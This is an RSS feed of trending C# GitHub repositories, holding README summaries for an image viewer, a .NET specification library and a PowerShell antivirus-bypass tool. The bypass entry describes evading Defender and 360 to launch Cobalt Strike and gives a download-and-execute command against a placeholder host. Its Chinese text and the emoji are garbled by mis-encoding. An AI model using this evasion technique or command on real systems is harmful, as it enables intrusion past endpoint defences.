<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C# Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-11-03T01:32:51Z</updated>
  <subtitle>Daily Trending of C# in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>d2phap/ImageGlass</title>
    <updated>2022-11-03T01:32:51Z</updated>
    <id>tag:github.com,2022-11-03:/d2phap/ImageGlass</id>
    <link href="https://github.com/d2phap/ImageGlass" rel="alternate"></link>
    <summary type="html">&lt;p&gt;üèû A lightweight, versatile image viewer&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;ImageGlass - A lightweight, versatile image viewer&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://imageglass.org&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/www-imageglass.org-0099BC.svg?maxAge=3600&amp;amp;color=%233097B8&#34; alt=&#34;Website&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/d2phap/ImageGlass/raw/master/LICENSE&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/license-GPLv3-green.svg?maxAge=3600&#34; alt=&#34;GPL Licence&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://crowdin.com/project/imageglass&#34;&gt;&lt;img src=&#34;https://d322cqt584bo4o.cloudfront.net/imageglass/localized.svg?sanitize=true&#34; alt=&#34;Crowdin&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://discord.io/imageglass&#34;&gt;&lt;img src=&#34;https://img.shields.io/discord/818852544859209748?label=chat&amp;amp;logo=discord&amp;amp;color=%233097B8&amp;amp;style=social&#34; alt=&#34;Discord&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://twitter.com/duongdieuphap&#34;&gt;&lt;img src=&#34;https://img.shields.io/twitter/follow/duongdieuphap?style=social&#34; alt=&#34;Twitter Follow&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;ImageGlass is a lightweight software application whose purpose is to help you view images in a clean and intuitive working environment. It gives you the possibility to view over &lt;strong&gt;80+&lt;/strong&gt; common image formats, including &lt;code&gt;.gif&lt;/code&gt;, &lt;code&gt;.svg&lt;/code&gt;, &lt;code&gt;.png&lt;/code&gt;, &lt;code&gt;.heic&lt;/code&gt;, ... and many more advanced features which help normal users or designers speed up their work.&lt;/p&gt; &#xA;&lt;h2&gt;üì• Download&lt;/h2&gt; &#xA;&lt;a href=&#34;https://www.microsoft.com/store/productId/9N33VZK3C7TH&#34;&gt; &lt;img height=&#34;69&#34; src=&#34;https://user-images.githubusercontent.com/3154213/197670614-b9ecc804-ebb2-44cc-88c3-5dd321564a51.svg?sanitize=true&#34;&gt;&lt;/a&gt; &#xA;&lt;br&gt; &#xA;&lt;a href=&#34;https://imageglass.org/download&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/downloads/d2phap/imageglass/total?color=%232A7C91&amp;amp;label=total%20downloads&amp;amp;style=for-the-badge&#34;&gt;&lt;/a&gt; &#xA;&lt;a href=&#34;https://imageglass.org/download&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/downloads/d2phap/imageglass/latest/total?color=%232A7C91&amp;amp;label=latest%20version&amp;amp;style=for-the-badge&#34;&gt;&lt;/a&gt; &#xA;&lt;h3&gt;ImageGlass on Microsoft Store!&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;If you want to &lt;strong&gt;purchase ImageGlass Store version without letting Microsoft to suck ü©∏ me 15% of the amount&lt;/strong&gt;, you can use the one-time donation from &lt;a href=&#34;https://github.com/sponsors/d2phap&#34;&gt;‚ô• GitHub Sponsor&lt;/a&gt;, then drop me a message in &lt;a href=&#34;https://discord.com/channels/818852544859209748/818852544859209751&#34;&gt;ImageGlass Discord&lt;/a&gt; or &lt;a href=&#34;https://imageglass.org/about&#34;&gt;email&lt;/a&gt;, and I will send the code shortly.&lt;/li&gt; &#xA; &lt;li&gt;ImageGlass Store provides the convenience of fast, easy installation onto all of your Windows devices along with fully automatic, behind-the-scenes updates with all the newest features, improvements, and fixes.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;a href=&#34;https://www.imageglass.org/download&#34; target=&#34;_blank&#34; title=&#34;View screen shots&#34;&gt; &lt;img src=&#34;https://github.com/ImageGlass/config/raw/main/screenshots/v8.7/8.7_1.jpg&#34; alt=&#34;ImageGlass 8.7.10.26&#34; width=&#34;640&#34;&gt; &lt;/a&gt;&#xA;&lt;br&gt; &#xA;&lt;h2&gt;üõ£ Development progress &amp;amp; Roadmap for ImageGlass 9.0&lt;/h2&gt; &#xA;&lt;p&gt;ImageGlass 9.0 is the biggest update ever, supports &lt;em&gt;&lt;strong&gt;hardware acceleration&lt;/strong&gt;&lt;/em&gt; and many more. I have been rewriting the entire app for months. There will be a few more beta releases before version 9.0 reaches a stable state. In the meanwhile, you will still receive the updates for version 8.x.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;‚úÖ &lt;a href=&#34;https://github.com/d2phap/ImageGlass/releases/tag/9.0.1.514&#34;&gt;Version 9.0 beta 1&lt;/a&gt; was released.&lt;/li&gt; &#xA; &lt;li&gt;‚úÖ &lt;a href=&#34;https://github.com/d2phap/ImageGlass/releases/tag/9.0.2.904&#34;&gt;Version 9.0 beta 2&lt;/a&gt; was released. Try it and let me know your feedback.&lt;/li&gt; &#xA; &lt;li&gt;üéØ &lt;a href=&#34;https://github.com/d2phap/ImageGlass/projects/13&#34;&gt;Version 9.0 beta 3&lt;/a&gt; is under development.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;ImageGlass 9 uses &lt;a href=&#34;https://devblogs.microsoft.com/dotnet/announcing-net-6/&#34;&gt;.NET 6&lt;/a&gt;. If you are unable to install .NET 6, you can still use version 8. &lt;br&gt; &lt;a href=&#34;https://devblogs.microsoft.com/dotnet/announcing-net-6/&#34; target=&#34;_blank&#34; rel=&#34;noreferrer noopener&#34;&gt; &lt;img src=&#34;https://kontext.tech/api/flex/medias/obj-2290&#34; alt=&#34;ImageGlass on .NET 6&#34; style=&#34;height:50px&#34;&gt; &lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;üë®‚Äçüíª Development&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Windows 10&lt;/li&gt; &#xA; &lt;li&gt;Visual Studio 2022&lt;/li&gt; &#xA; &lt;li&gt;.NET Framework 4.8 for v8.x, .NET 6 for v9.0&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;The &lt;code&gt;develop&lt;/code&gt; branch contains the latest commits of version 8.x while the &lt;code&gt;prod&lt;/code&gt; branch is for the final stable release. For the source code of version 9.0 beta, you can check &lt;code&gt;v9&lt;/code&gt; branch.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;Pull Request&lt;/code&gt;&lt;/strong&gt; is most welcome!&lt;/p&gt; &#xA;&lt;h2&gt;üìö Docs&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://imageglass.org/docs/features&#34;&gt;Features&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://imageglass.org/docs/supported-formats&#34;&gt;Supported formats&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://imageglass.org/docs/ui-shortcuts-reference&#34;&gt;Shortcuts&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://imageglass.org/docs/app-configs&#34;&gt;App configs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://imageglass.org/docs/command-line-utilities&#34;&gt;Command lines&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;For more information about ImageGlass, go to &lt;a href=&#34;https://imageglass.org/docs&#34;&gt;Documentation&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;ü§º Community and Support&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/d2phap/ImageGlass/issues&#34;&gt;GitHub issues&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://discord.io/imageglass&#34;&gt;ImageGlass Discord&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://groups.google.com/forum/#!forum/imageglass&#34;&gt;Google forum&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;üíñ This project needs your help!&lt;/h2&gt; &#xA;&lt;p&gt;ImageGlass is an open source, free, and ad-free photo viewer, but developing and maintaining it is not. Your financial support gives me more motivation to work on future releases. You can sponsor my work on GitHub (one-time/monthly, no service fee), Patreon (monthly), PayPal,...&lt;/p&gt; &#xA;&lt;p&gt;If you choose &lt;strong&gt;GitHub Sponsor&lt;/strong&gt; or &lt;strong&gt;Patreon&lt;/strong&gt;, make sure you check out &lt;strong&gt;the tier benefits included&lt;/strong&gt;.&lt;br&gt; Thanks for your support!&lt;/p&gt; &#xA;&lt;a href=&#34;https://github.com/sponsors/d2phap&#34; target=&#34;_blank&#34; title=&#34;Become a sponsor&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/Github-@d2phap-24292e.svg?maxAge=3600&amp;amp;logo=github&#34; height=&#34;30&#34; alt=&#34;Become a sponsor&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://www.patreon.com/d2phap&#34; target=&#34;_blank&#34; title=&#34;Become a patron&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/Patreon-@d2phap%20-e85b46.svg?maxAge=3600&amp;amp;logo=patreon&#34; height=&#34;30&#34; alt=&#34;Become a patron&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://www.paypal.me/d2phap&#34; target=&#34;_blank&#34; title=&#34;Buy me a beer?&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/PayPal-Donate%20$10%20-0070ba.svg?maxAge=3600&amp;amp;logo=paypal&#34; height=&#34;30&#34; alt=&#34;Buy me a beer?&#34;&gt; &lt;/a&gt; &#xA;&lt;a href=&#34;https://donorbox.org/imageglass&#34; target=&#34;_blank&#34; title=&#34;Wire transfer&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/DonorBox-@imageglass%20-005384.svg?maxAge=3600&amp;amp;logo=donorbox&#34; height=&#34;30&#34; alt=&#34;Wire transfer&#34;&gt; &lt;/a&gt; &#xA;&lt;h2&gt;üëë Hall of fame (v8.x)&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://repobeats.axiom.co/api/embed/4a2781a2a149dd21826309275304696ec75b21fd.svg?sanitize=true&#34; alt=&#34;Analytics image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;To honor those people who spent their time contributing to the development of ImageGlass v8:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/BenHUET&#34;&gt;@BenHUET&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/2480258&#34;&gt;@2480258&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/siblount&#34;&gt;@siblount&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/SylwesterZarebski&#34;&gt;@SylwesterZarebski&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Sxderp&#34;&gt;@Sxderp&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/fire-eggs&#34;&gt;@fire-eggs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/AutomationBoi&#34;&gt;@AutomationBoi&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/datasone&#34;&gt;@datasone&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dixonte&#34;&gt;@dixonte&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/cocoon&#34;&gt;@cocoon&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Norgerman&#34;&gt;@Norgerman&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/flyxyz123&#34;&gt;@flyxyz123&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Thank you!&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>H4de5-7/powershell-bypass</title>
    <updated>2022-11-03T01:32:51Z</updated>
    <id>tag:github.com,2022-11-03:/H4de5-7/powershell-bypass</id>
    <link href="https://github.com/H4de5-7/powershell-bypass" rel="alternate"></link>
    <summary type="html">&lt;p&gt;powershellÂëΩ‰ª§ÂÖçÊùÄÁöÑÂ∞èÂ∑•ÂÖ∑ÔºåÂèØËøáDefender„ÄÅ360Á≠âÔºåÂèØÊâßË°å‰∏äÁ∫øcobaltstrike„ÄÅÊ∑ªÂä†ËÆ°Âàí‰ªªÂä°Á≠â&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;powershell-bypss&lt;/h1&gt; &#xA;&lt;p&gt;powershellÂëΩ‰ª§ÂÖçÊùÄÁöÑÂ∞èÂ∑•ÂÖ∑ÔºåÂèØËøáDefender„ÄÅ360Á≠âÔºåÂèØÊâßË°å‰∏äÁ∫øcobaltstrike„ÄÅÊ∑ªÂä†ËÆ°Âàí‰ªªÂä°Á≠â„ÄÇ&lt;/p&gt; &#xA;&lt;p&gt;‰∏äËø∞ÊµãËØïÁéØÂ¢ÉÂùá‰∏∫ÂÆû‰ΩìÊú∫„ÄÇ&lt;/p&gt; &#xA;&lt;p&gt;ÊÄùË∑ØÂæàÁÆÄÂçïÔºåÂæà‰πÖ‰πãÂâçÂ∞±Êúâ‰∫ÜÔºåÂ∑•ÂÖ∑Ë∞ÉÁî®C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.AutomationÁõÆÂΩï‰∏ãÈù¢ÁöÑSystem.Management.Automation.dllÊâßË°åÂ∫ïÂ±ÇapiÊù•ÁªïËøáÊùÄËΩØÂØπpowershellÁöÑÁõëÊéß„ÄÇ&lt;/p&gt; &#xA;&lt;p&gt;Â∞ùËØïËøá‰ΩøÁî®base64ÂØπÂëΩ‰ª§ËøõË°åÁºñÁ†ÅÔºå‰ΩÜÊòØÂ•ΩÂÉè‰ºöË¢´DefenderÊ£ÄÊµãÔºåÁî®Á∫ØÂëΩ‰ª§ÂèçËÄå‰∏ç‰ºöÔºåËøôÈáåÁî®+Âä†Âè∑ÊõøÊç¢‰∫ÜÂëΩ‰ª§‰∏≠Á©∫Ê†ºÔºåÂΩìÁÑ∂ËøôÂ∞±ÊòØ‰∏Ä‰∏™ÂëΩ‰ª§ÁöÑÂä†ËΩΩÂô®ÔºåÂÖ∑‰ΩìÊÄé‰πàÂä†ÂØÜÂëΩ‰ª§ÊúâÂêÑÁßçÂêÑÊ†∑ÁöÑÊñπÊ≥ï„ÄÇ&lt;/p&gt; &#xA;&lt;p&gt;Áî±‰∫éÊòØC#ÔºåÂõ†Ê≠§ÂèØ‰ª•Áî®execute-assemblyÂÜÖÂ≠òÊâßË°åÁöÑÊñπÂºèÊù•‰∏çËêΩÂú∞ÊâßË°åÔºå‰∏çËøácsÊú¨Ë∫´ÁöÑpowerpickÂ∞±ÂÆûÁé∞‰∫ÜËøô‰∏™ÂäüËÉΩÔºåËøôÈáåÂè™ÊòØÂçïÊãøÂá∫Êù•ÂÅö‰∏Ä‰∏™Â∞èÂ∑•ÂÖ∑„ÄÇ&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Â∏àÂÇÖ‰ª¨Ê≥®ÊÑèÈÅøÂÖçÁî®powershellÂëΩ‰ª§Ôºå‰∏äÁ∫øcobaltstrikeÂè™ÈúÄË¶Å&lt;code&gt;Csharp.exe IEX+((new-object+net.webclient).downloadstring(&#39;http://ip:port/a&#39;))&lt;/code&gt;Ë£∏ÂëΩ‰ª§ÔºåÂ¶ÇÊûú‰ª•powershellÂºÄÂ§¥ÈÇ£‰πàËøòÊòØ‰ºöË∞ÉÁî®powershellË¢´360Êã¶Êà™ÁöÑ„ÄÇ&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;ËøôÈáåÂè™ÊòØÂÅö‰∫Ü‰∏™Â∞èdemoÔºåÂ∏àÂÇÖ‰ª¨ÂèØ‰ª•Âú®demoÁöÑÂü∫Á°Ä‰∏äÊù•ËÆæÁΩÆËá™Â∑±ÁöÑÂëΩ‰ª§Âä†ÂØÜÊñπÂºèÔºåËøôÊ†∑ÂèØ‰ª•Êõ¥ÊúâÊïàÂú∞ÈÅøÂÖçÊùÄËΩØÁöÑÈùôÊÄÅÊ£ÄÊµã„ÄÇ&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/48757788/198879143-1caaf6d9-2ed9-4894-9233-10ff7aa7ad39.jpg&#34; alt=&#34;32430eaf1b8ae7db520dd85e5cc82bf&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/48757788/198879156-82253c57-ff50-4b21-be0d-d71253db032b.jpg&#34; alt=&#34;d559a936be1592a0bcbbaff24e88dc8&#34;&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>ardalis/Specification</title>
    <updated>2022-11-03T01:32:51Z</updated>
    <id>tag:github.com,2022-11-03:/ardalis/Specification</id>
    <link href="https://github.com/ardalis/Specification" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Base class with tests for adding specifications to a DDD model&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&#34;https://www.nuget.org/packages/Ardalis.Specification&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/v/Ardalis.Specification.svg?sanitize=true&#34; alt=&#34;NuGet&#34;&gt;&lt;/a&gt;&lt;a href=&#34;https://www.nuget.org/packages/Ardalis.Specification&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/dt/Ardalis.Specification.svg?sanitize=true&#34; alt=&#34;NuGet&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/ardalis/specification/actions&#34;&gt;&lt;img src=&#34;https://github.com/ardalis/specification/workflows/ASP.NET%20Core%20CI/badge.svg?sanitize=true&#34; alt=&#34;Actions Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://ardalis.github.io/Specification/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Documentation-Ardalis.Specification%20v5-Green.svg?sanitize=true&#34; alt=&#34;Generic badge&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;a href=&#34;https://twitter.com/intent/follow?screen_name=ardalis&#34;&gt; &lt;img src=&#34;https://img.shields.io/twitter/follow/ardalis.svg?label=Follow%20@ardalis&#34; alt=&#34;Follow @ardalis&#34;&gt; &lt;/a&gt; &amp;nbsp; &#xA;&lt;a href=&#34;https://twitter.com/intent/follow?screen_name=fiseni&#34;&gt; &lt;img src=&#34;https://img.shields.io/twitter/follow/fiseni.svg?label=Follow%20@fiseni&#34; alt=&#34;Follow @fiseni&#34;&gt; &lt;/a&gt; &amp;nbsp; &#xA;&lt;a href=&#34;https://twitter.com/intent/follow?screen_name=nimblepros&#34;&gt; &lt;img src=&#34;https://img.shields.io/twitter/follow/nimblepros.svg?label=Follow%20@nimblepros&#34; alt=&#34;Follow @nimblepros&#34;&gt; &lt;/a&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://stars.medv.io/ardalis/specification&#34;&gt;&lt;img src=&#34;https://stars.medv.io/ardalis/specification.svg?sanitize=true&#34; alt=&#34;Stars Sparkline&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Give a Star! &lt;span&gt;‚≠ê&lt;/span&gt;&lt;/h2&gt; &#xA;&lt;p&gt;If you like or are using this project please give it a star. Thanks!&lt;/p&gt; &#xA;&lt;h1&gt;Specification&lt;/h1&gt; &#xA;&lt;p&gt;Base class with tests for adding specifications to a DDD model. Also includes a default generic Repository base class with support for EF6 and EF Core. Currently used in Microsoft reference application &lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnWeb&#34;&gt;eShopOnWeb&lt;/a&gt;, which is the best place to see it in action, as well as the &lt;a href=&#34;https://github.com/ardalis/cleanarchitecture&#34;&gt;Clean Architecture solution template&lt;/a&gt;. Check out Steve &#34;ardalis&#34; Smith&#39;s associated (free!) eBook, &lt;a href=&#34;https://aka.ms/webappebook&#34;&gt;Architecting Modern Web Applications with ASP.NET Core and Azure&lt;/a&gt;, as well.&lt;/p&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://ardalis.github.io/Specification/&#34;&gt;Read the Documentation&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;h3&gt;Videos&lt;/h3&gt; &#xA;&lt;p&gt;üé• &lt;a href=&#34;https://www.youtube.com/watch?v=gT72mWdD4Qo&amp;amp;ab_channel=Ardalis&#34;&gt;Watch What&#39;s New in v5 of Ardalis.Specification&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;üé• &lt;a href=&#34;https://www.youtube.com/watch?v=BgWWbBUWyig&#34;&gt;Watch an Overview of the Pattern and this Package&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Version 6 Release Notes&lt;/h2&gt; &#xA;&lt;h3&gt;Breaking changes&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Improve in-memory evaluation performance. &lt;a href=&#34;https://github.com/ardalis/Specification/issues/182&#34;&gt;#182&lt;/a&gt;. &lt;strong&gt;Breaking Changes:&lt;/strong&gt; The specification state for &lt;code&gt;Where&lt;/code&gt;, &lt;code&gt;Order&lt;/code&gt;, and &lt;code&gt;Search&lt;/code&gt; expressions is stored in separate types.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Remove &lt;code&gt;Paginate&lt;/code&gt; builder action. &lt;strong&gt;Breaking Change&lt;/strong&gt; (It was marked as obsolete since version 4). &lt;a href=&#34;https://github.com/ardalis/Specification/issues/189&#34;&gt;Issue #189&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Other updates&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Add support for &lt;code&gt;AnyAsync&lt;/code&gt; in the base repository. &lt;a href=&#34;https://github.com/ardalis/Specification/issues/180&#34;&gt;#180&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Add SQL Like implementation for the in-memory evaluator. &lt;a href=&#34;https://github.com/ardalis/Specification/issues/150&#34;&gt;#150&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Add support for IgnoreQueryFilters. &lt;a href=&#34;https://github.com/ardalis/Specification/issues/159&#34;&gt;#159 &lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Return &lt;code&gt;Task&amp;lt;int&amp;gt;&lt;/code&gt; from SaveChangesAsync. &lt;a href=&#34;https://github.com/ardalis/Specification/issues/174&#34;&gt;#174 &lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Add support for &lt;code&gt;condition&lt;/code&gt; in the specification builder methods. &lt;a href=&#34;https://github.com/ardalis/Specification/issues/143&#34;&gt;#143&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Improve &lt;code&gt;Include&lt;/code&gt; evaluation performance by implementing caching (opt-in feature). &lt;a href=&#34;https://github.com/ardalis/Specification/issues/187&#34;&gt;Issue #187&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Implement infrastructure for specification validators. &lt;a href=&#34;https://github.com/ardalis/Specification/issues/111&#34;&gt;Issue #111&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;GetBySpecAsync&lt;/code&gt; and similar methods are marked obsolete; prefer &lt;code&gt;FirstOrDefault&lt;/code&gt; or &lt;code&gt;SingleOrDefault&lt;/code&gt; instead.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Sample Usage&lt;/h2&gt; &#xA;&lt;p&gt;The Specification pattern pulls query-specific logic out of other places in the application where it currently exists. For applications with minimal abstraction that use EF Core directly, the specification will eliminate &lt;code&gt;Where&lt;/code&gt;, &lt;code&gt;Include&lt;/code&gt;, &lt;code&gt;Select&lt;/code&gt; and similar expressions from almost all places where they&#39;re being used. In applications that abstract database query logic behind a &lt;code&gt;Repository&lt;/code&gt; abstraction, the specification will typically eliminate the need for many custom &lt;code&gt;Repository&lt;/code&gt; implementation classes as well as custom query methods on &lt;code&gt;Repository&lt;/code&gt; implementations. Instead of many different ways to filter and shape data using various methods, the same capability is achieved with few core methods.&lt;/p&gt; &#xA;&lt;p&gt;Example implementation in your repository using specifications&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c#&#34;&gt;public async Task&amp;lt;List&amp;lt;T&amp;gt;&amp;gt; ListAsync(ISpecification&amp;lt;T&amp;gt; specification, CancellationToken cancellationToken = default)&#xA;{&#xA;&#x9;return await ApplySpecification(specification).ToListAsync(cancellationToken);&#xA;}&#xA;&#xA;private IQueryable&amp;lt;T&amp;gt; ApplySpecification(ISpecification&amp;lt;T&amp;gt; specification)&#xA;{&#xA;&#x9;return SpecificationEvaluator.Default.GetQuery(dbContext.Set&amp;lt;T&amp;gt;().AsQueryable(), specification);&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Now to use this method, the calling code simply instantiates and passes the appropriate specification.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c#&#34;&gt;var spec = new CustomerByNameSpec(&#34;customerName&#34;);&#xA;var customers = await _repository.ListAsync(spec, cancellationToken);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Specifications should be defined in an easily-discovered location in the application, so developers can easily reuse them. The use of this pattern helps to eliminate many commonly duplicated lambda expressions in applications, reducing bugs associated with this duplication.&lt;/p&gt; &#xA;&lt;p&gt;We&#39;re shipping a built-in repository implementation &lt;a href=&#34;https://github.com/ardalis/Specification/raw/main/Specification.EntityFrameworkCore/src/Ardalis.Specification.EntityFrameworkCore/RepositoryBaseOfT.cs&#34;&gt;RepositoryBase&lt;/a&gt;, ready to be consumed in your apps. You can use it as a reference and create your own custom repository implementation.&lt;/p&gt; &#xA;&lt;h2&gt;Running the tests&lt;/h2&gt; &#xA;&lt;p&gt;This project needs a database to test, since a lot of the tests validate that a specification is translated from LINQ to SQL by EF Core. To run the tests, we&#39;re using docker containers, including a docker-hosted SQL Server instance. You run the tests by simply running &lt;code&gt;RunTests.bat&lt;/code&gt; or &lt;code&gt;RunTests.sh&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Reference&lt;/h2&gt; &#xA;&lt;p&gt;Some free video streams in which this package has been developed and discussed on &lt;a href=&#34;http://youtube.com/ardalis?sub_confirmation=1&#34;&gt;YouTube.com/ardalis&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=BgWWbBUWyig&amp;amp;t=315s&amp;amp;ab_channel=Ardalis&#34;&gt;Reviewing the Specification Pattern and NuGet Package with guest Fiseni&lt;/a&gt; 6 Nov 2020&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=zP_279p2D9w&#34;&gt;Open Source .NET Development with Specification and Other Projects&lt;/a&gt; 14 Jan 2020&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=kCeRJj2H1RQ&#34;&gt;Updating Specification and GuardClauses Nuget Packages / GitHub Samples&lt;/a&gt; 20 Nov 2019&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=PbHic9Ndqoc&#34;&gt;Ardalis - Working on the Ardalis.Specification and EF Extensions GitHub projects&lt;/a&gt; 16 Aug 2019&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=Ia3zb6-2LuY&#34;&gt;Working on the Ardalis.Specification Nuget Package and Integration Tests&lt;/a&gt; 23 July 2019&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Pluralsight resources:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.pluralsight.com/courses/patterns-library&#34;&gt;Design Patterns Library - Specification&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.pluralsight.com/courses/domain-driven-design-fundamentals&#34;&gt;Domain-Driven Design Fundamentals&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a 